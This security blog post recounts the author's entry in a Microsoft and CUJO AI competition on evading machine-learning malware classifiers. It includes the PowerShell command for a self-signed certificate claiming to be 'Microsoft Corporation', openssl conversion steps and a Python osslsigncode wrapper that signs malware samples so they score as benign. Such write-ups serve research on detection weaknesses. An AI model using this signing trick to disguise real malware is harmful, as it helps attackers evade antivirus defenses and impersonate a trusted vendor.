<!DOCTYPE html>
<html lang="en-us">
<head prefix="og: http://ogp.me/ns#">
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <meta name="description" content="This year one of my goals was to learn about machine learning and artificial intelligence.
I wrote about my journey before - including what classes I took and …" />
  <link rel="canonical" href="https://embracethered.com/blog/posts/2020/microsoft-machine-learning-security-evasion-competition/" />
  <meta property="og:title" content=" Participating in the Microsoft Machine Learning Security Evasion Competition - Bypassing malware models by signing binaries &middot;  Embrace The Red" />
  <meta property="og:description" content="This year one of my goals was to learn about machine learning and artificial intelligence.
I wrote about my journey before - including what classes I took and …" />
  <meta property="og:site_name" content="Embrace The Red" />
  <meta property="og:url" content="https://embracethered.com/blog/posts/2020/microsoft-machine-learning-security-evasion-competition/" />
  <meta property="og:type" content="article" />
  <meta property="og:article:published_time" content="2020-09-22T14:00:41-07:00" />
  <meta property="og:article:tag" content="machine learning" />
  <meta property="og:article:tag" content="red" />

  <title>
     Participating in the Microsoft Machine Learning Security Evasion Competition - Bypassing malware models by signing binaries &middot;  Embrace The Red
  </title>

  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
  
  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
  <link rel="shortcut icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
  <link rel="apple-touch-icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />

  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "\"Participating in the Microsoft Machine Learning Security Evasion Competition - Bypassing malware models by signing binaries\"",
    "description": "\"This year one of my goals was to learn about machine learning and artificial intelligence.\\nI wrote about my journey before - including what classes I took and …\"",
    "author": {
      "@type": "Person",
      "name": "wunderwuzzi",
      "url": "https://x.com/wunderwuzzi23"
    },
    "publisher": {
      "@type": "Organization",
      "name": "\"Embrace The Red\"",
      "logo": {
        "@type": "ImageObject",
        "url": "https:\/\/embracethered.com\/blog\/images/favicon.ico"
      }
    },
    "url": "\"https://embracethered.com/blog/posts/2020/microsoft-machine-learning-security-evasion-competition/\"",
    "datePublished": "\"2020-09-22T14:00:41-07:00\"","dateModified": "\"2020-09-22T14:00:41-07:00\"",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "\"https://embracethered.com/blog/posts/2020/microsoft-machine-learning-security-evasion-competition/\""
    }
  }
  </script>

</head>
<body>
    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
    <section class="header-text">
      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
      
      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
        wunderwuzzi&#39;s blog
        <br><div style="color: greenyellow; font-weight:400;">learn the hacks, stop the attacks.</div> 
      </div>
      
      <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>

      
      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
        <i class="fa fa-angle-left" aria-hidden="true"></i>
        &nbsp;Home
      </a>
      
    
      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
        <i class="fa fa-rss" aria-hidden="true"></i>
        &nbsp;Subscribe
      </a>
    </section>
  </header>
  <main class="container">


<article>
  <header>
    <h1 class="text-primary">Participating in the Microsoft Machine Learning Security Evasion Competition - Bypassing malware models by signing binaries</h1>
    <div class="post-meta clearfix">
    
      <div class="post-date pull-left">
        Posted on
        <time datetime="2020-09-22T14:00:41-07:00">
          Sep 22, 2020
        </time>
      </div>
    
      <div class="pull-right">
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/machine-learning">#machine learning</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
        
      </div>
    </div>
  </header>
  <section>
    <p>This year one of my goals was to learn about machine learning and artificial intelligence.</p>
<p>I wrote about my journey before - including <a href="/blog/posts/2020/machine-learning-basics">what classes I took and books I read</a>, the <a href="/blog/posts/2020/husky-ai-walkthrough">models and systems I built</a> and <a href="/blog/posts/2020/husky-ai-mlops-operationalize-the-model">operationalized</a>, <a href="/blog/posts/2020/husky-ai-threat-modeling-machine-learning">threat modeling it</a> to <a href="/blog/posts/2020/husky-ai-machine-learning-attack-bruteforce">learn about practical attacks and defenses</a>. My goal is to be knowledge enough in the AI/ML space enough to be able to help bridge the gap between research and operational red teaming - by doing practical things with life systems.</p>
<p>In mid-August I learned that Microsoft and CUJO AI are hosting a <a href="https://github.com/Azure/2020-machine-learning-security-evasion-competition/blob/master/README.md">Machine Learning Security Evasion Competition</a>.</p>
<p>That aligned perfectly with my desire to continue learning more about machine learning and attacks.</p>
<h2 id="machine-learning-security-evasion-competition">Machine Learning security evasion competition</h2>
<p>The competition took place over a course of multiple weeks, starting in June. It was split into a <strong>&ldquo;Defender Challenge&rdquo;</strong> and an <strong>&ldquo;Attacker Challenge&rdquo;</strong>.</p>
<p>I learned about the event a bit late, so only participated in the <strong>Attacker Challenge</strong>.</p>
<h3 id="attacker-challenge">Attacker Challenge</h3>
<p>There were three machine learning models that predict if a given file is malware or not.</p>
<p><img src="/blog/images/2020/binary.jpg" alt="Binary Attack"></p>
<p>The contestants were given 50 malware samples. The goal was to modify them to bypass the online hosted model. As an extra challenge the modified malware is still required to do its malicious deeds.</p>
<p><strong>This sounded super fun!</strong></p>
<h3 id="what-does-ml-have-to-do-with-malware-detection">What does ML have to do with malware detection?</h3>
<p>In case you are not familiar with machine learning and how it can be used in malware detection, here is a quick overview. Feel free to skip this, if you are interested in the <a href="#hacking">hacking</a>.</p>
<p>The idea is to have a model that scores a given binary on how likely it is to be malware.</p>
<p>Windows uses the <a href="https://upload.wikimedia.org/wikipedia/commons/1/1b/Portable_Executable_32_bit_Structure_in_SVG_fixed.svg">Portable Executable (PE)</a> format as data structure to describe a binary image. An image contains the things Windows needs to load and run a binary, including the code and things such as strings, exports, imports, debug information and a lot more.</p>
<p>To train a model it takes taking thousands of existing malware samples and analyzing their properties. For instance one can analyze what strings binaries contain and what libraries are referenced and so forth. In machine learning this is called &ldquo;feature extraction&rdquo;.</p>
<p><img src="/blog/images/2020/malware.jpg" alt="Matrix"></p>
<p>The extracted features are then given to the model to train it on malware. During training the model is also given benign binaries to teach it how non-malware features look like in comparison. After many iterations (epochs) of training the outcome is hopefully a model with high accuracy on distinguishing malware from non-malware.</p>
<p>If you are interested to learn more check out <a href="https://github.com/endgameinc/ember">Ember</a>.</p>
<p>Hope that was a useful high level description in case you were wondering what this all is about.</p>
<h2 id="hacking">Hacking the models</h2>
<p>Now, it let&rsquo;s talk about the hacking.</p>
<p>The event organizers provided code to optimize binaries with a set of techniques. There was also code to interact with one offline and the three online models. I ran the first offline attacks with the 50 malware samples to have a bit of a baseline. The following is an explanation of the two main ideas I tried to find more bypasses.</p>
<h3 id="attempt-1-hiding-messages-in-binaries">Attempt 1: Hiding messages in binaries</h3>
<p>The day I learned about the competition I happened to read this blog post <a href="https://blog.yossarian.net/2020/08/16/Hiding-messages-in-x86-binaries-using-semantic-duals">&ldquo;Hiding messages in x86 binaries using semantic duals&rdquo;</a>. It is a interesting article about steganography. I thought that this might also help with evasion.</p>
<p>That same evening I went ahead to try it out. I noticed how it started to have impact on scoring, but the changes were minimal. So, this was not going to be fruitful.</p>
<h3 id="attempt-2-authenticode-signing-binaries">Attempt 2: Authenticode signing binaries</h3>
<p>Luckily, I already had a second idea in my head which I thought would be cool to try.</p>
<p><strong>My goal was to run the binaries through optimization and afterwards &ldquo;Authenticode Sign&rdquo; the best scoring one.</strong></p>
<p>To do that, I first created a <strong>&ldquo;self-signed Microsoft&rdquo;</strong> signing certificate:</p>
<pre tabindex="0"><code>$cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject &#34;Microsoft Corporation&#34; -FriendlyName &#34;Microsoft Authenticode&#34; -CertStoreLocation Cert:\CurrentUser\My
</code></pre><p>This is how that looked like:</p>
<p><a href="/blog/images/2020/authenticode-cert.jpg"><img src="/blog/images/2020/authenticode-cert.jpg" alt="&ldquo;self-signed&rdquo; Microsoft Authenticode signature"></a></p>
<p><strong>Looks pretty legit - or? :)</strong></p>
<h3 id="automating-signing-windows-binaries-on-linux">Automating signing Windows binaries on Linux</h3>
<p>Since I do machine learning on Linux and I did not want to have to copy binaries back and forth I needed a way to sign Windows binaries on Linux. Hence, I exported the certificate to <code>.pfx</code> format and copied it over to a Linux host.</p>
<p>Then I used <code>openssl</code> to create the necessary files for signing:</p>
<pre tabindex="0"><code>openssl pkcs12 -in authenticode.pfx -nocerts -nodes -out key.pem
openssl rsa -in key.pem -outform PVK -pvk-strong -out authenticode.pvk
openssl pkcs12 -in authenticode.pfx -nokeys -nodes -out cert.pem
openssl crl2pkcs7 -nocrl -certfile cert.pem -outform DER -out authenticode.spc
</code></pre><p>Next, I added a Python function, called <code>sign</code>:</p>
<pre tabindex="0"><code>def sign(filename_to_sign):

        signed_filename = filename_to_sign+&#34;.signed&#34;

        name = &#34;Defender Protection Safe Smart Browsing Microsoft Azure Testing&#34;*1200
        url  = &#34;https://&#34; + (&#34;microsoft.com/&#34; *3400)
        cp = subprocess.run(
            [&#34;osslsigncode&#34;,&#34;sign&#34;,&#34;-pass&#34;,&#34;test&#34;,&#34;-h&#34;,&#34;sha512&#34;,&#34;-comm&#34;,
             &#34;-n&#34;,name,
             &#34;-i&#34;, url, 
             &#34;-in&#34;, filename_to_sign, 
             &#34;-out&#34;, signed_filename,
             #&#34;-t&#34;, &#34;[a time stamp server can be here]&#34;,
             &#34;-certs&#34;,&#34;code/authenticode.spc&#34;, 
             &#34;-key&#34;,&#34;code/authenticode.pvk&#34;] 
        )

        if cp.returncode == 0:
            print(&#34;Successfully signed&#34;)
            with open(signed_filename, &#39;rb&#39;) as signedfile:
                signed_input_file_bytes = signedfile.read()
        else:
            print(f&#34;Failed signing {cp.returncode}&#34;)
            signed_input_file_bytes = 0

        return signed_filename, signed_input_file_bytes
</code></pre><p>Notice how I strongly believed that strings like &ldquo;Microsoft, Defender, Smart, Azure,&hellip;&rdquo; would help with evasion. I also made the strings in the signatures quite long. I remember playing around with different strings a bit also.</p>
<p>An interesting behavior was regarding timestamping. It seems that signing with timestamp server improved results. Although, being a good Internet citizen, I did not use that too much.</p>
<h3 id="actually-signing-windows-binaries-on-linux">Actually signing Windows binaries on Linux</h3>
<p>First I tried the tool <code>signcode</code>, but for some reason that I can&rsquo;t recall right now it did not work. Then I switched to <code>osslsigncode</code> which worked nicely.</p>
<p>This is how the very first signature looked like:</p>
<p><a href="/blog/images/2020/signed-binary.png"><img src="/blog/images/2020/signed-binary.png" alt="Signed Binary"></a></p>
<p>For reference, below is how one of them looks when explored with then Windows UI:</p>
<p><a href="/blog/images/2020/signed-binary-ui.png"><img src="/blog/images/2020/signed-binary-ui.png" alt="Signed Binary"></a></p>
<p>The results were interesting as well, here is an example:</p>
<pre tabindex="0"><code>File size (in MB):        0.12402629852294922
File size -signed(in MB): 0.23458099365234375
Result (p)           = [1, 0.9999026665162378]
Result Signed (p)    = [0, 0.3044929319917459]
</code></pre><p>You can see the file size increased quite a bit with the signature, similarly the score dropped drastically. This was a common pattern - at least for the &ldquo;Ember&rdquo; model.</p>
<h2 id="watching-the-scoreboard">Watching the scoreboard</h2>
<p>After that I had about 48 or so bypasses, which had put me in first position on the scoreboard. So I rested for weeks, and wanted to do some more research a few days before the competition ended. Although, I ended up watching the US Open tennis finals - &ldquo;Go Dominic Thiem!&rdquo; :)</p>
<p>The night before the competition ended, I noticed being in 4th place - I hoped to make it into the top 3. So, I did another set of variations for the strings used when signing and got bypasses for 84/150 which put me in third spot!</p>
<p><a href="/blog/images/2020/machine-learning-competition-scoreboard.png"><img src="/blog/images/2020/machine-learning-competition-scoreboard.png" alt="Scoreboard"></a></p>
<p>Overall, I used 378 API queries, which I thought was not bad.</p>
<p><strong>UPDATE: The organizers reached out to inform me that I actually made 2nd place.</strong> :) There were some issues on how scores got calculated which inflated some of the results.</p>
<h2 id="thanks-to-the-organizers">Thanks to the organizers!</h2>
<p>Thanks to the organizers of the competition Microsoft and <a href="https://cujo.com">CUJO AI</a>. I cannot imagine how much works this must be behind the scenes. Having the malware detonate in sandboxes, watch for IOCs to make sure it’s still working and also building the frontend and web UI as well as running all the logistics to make this happen. Great job organizing this!</p>
<p>Cheers,
Johann.</p>
<p>Twitter: <a href="https://twitter.com/wunderwuzzi23">@wunderwuzzi23</a></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/Azure/2020-machine-learning-security-evasion-competition/blob/master/README.md">Machine Learning Security Evasion Competition</a>.</li>
<li><a href="https://blog.yossarian.net/2020/08/16/Hiding-messages-in-x86-binaries-using-semantic-duals">Hiding messages in x86 binaries using semantic duals</a></li>
<li><a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:MSIL/Chippedout.A!dha&amp;threatId=-2147243850">Trojan:MSIL/Chippedout.A!dha</a></li>
<li><a href="https://lief.quarkslab.com/">Lief framework to parse PE</a></li>
<li><a href="https://github.com/endgameinc/ember">Ember repo by Endgame, Inc</a></li>
<li><a href="https://upload.wikimedia.org/wikipedia/commons/1/1b/Portable_Executable_32_bit_Structure_in_SVG_fixed.svg">Portable Executable Image Explanation</a></li>
<li>Modified image <a href="https://pixabay.com/illustrations/hacked-cyber-hacking-security-4100286/">&ldquo;hacked&rdquo; by Pete Linforth</a> from Pixabay</li>
<li><a href="https://pixabay.com/illustrations/binary-binary-code-focal-point-2525243/">Image &ldquo;binary&rdquo;</a> by Gerd Altmann from Pixabay</li>
<li><a href="https://cujo.com/">CUJO AI</a></li>
</ul>

  </section>
  <footer>
    
    
    
    <footer></footer><hr/>
    
    <ul class="pager">
      
      <li class="next"><a href="https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">Newer <span aria-hidden="true">&rarr;</span></a></li>
      
      
      <li class="author-contact">
        <a href="mailto:security@wunderwuzzi.net">
          <i class="fa fa-envelope-o" aria-hidden="true"></i>
          &nbsp;Contact me
        </a>
     </li>

      
      
      <li class="previous"><a href="https://embracethered.com/blog/posts/2020/husky-ai-machine-learning-backdoor-model/"><span aria-hidden="true">&larr;</span> Older</a></li>
      
    </ul>
  </footer>
</article>
</main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
     
     (c) WUNDERWUZZI 2018-2026
     <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>
 
     <div style="font-size:small;font-style: italic;color:crimson">
    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
    </div>
    </div>
</footer>
  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  



<script type="text/javascript">
  var _paq = window._paq || [];
  _paq.push(["disableCookies"]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//wuzzi.net/anamato/inc/";
    _paq.push(['setTrackerUrl', u+'rts.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
  
</body>
</html>

